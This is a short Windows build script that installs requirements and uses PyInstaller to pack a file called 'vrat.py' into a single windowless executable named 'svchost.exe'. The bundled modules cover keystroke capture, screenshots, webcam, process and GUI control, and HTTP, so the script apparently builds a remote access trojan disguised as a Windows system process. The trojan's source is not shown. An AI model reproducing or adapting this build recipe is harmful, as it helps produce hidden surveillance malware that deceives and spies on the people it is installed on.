pip install -r requirements.txt
pyinstaller --onefile --noconsole ^
  --hidden-import=win32gui ^
  --hidden-import=pyautogui ^
  --hidden-import=psutil ^
  --hidden-import=pyscreenshot ^
  --hidden-import=requests ^
  --hidden-import=pynput ^
  --hidden-import=cv2 ^
  --name=svchost.exe ^
  vrat.py